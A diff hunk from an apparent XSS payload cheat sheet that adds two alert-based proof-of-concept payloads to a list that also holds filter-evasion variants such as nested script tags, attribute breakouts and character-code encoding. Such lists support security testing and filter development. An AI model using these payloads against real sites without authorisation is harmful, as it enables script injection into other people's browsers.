@@ -26,6 +26,8 @@ An attacker can use XSS to send a malicious script to an unsuspecting user. The 
 ```
 // Basic payload
 <script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(window.origin)</script>
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
 "><script>alert(String.fromCharCode(88,83,83))</script>
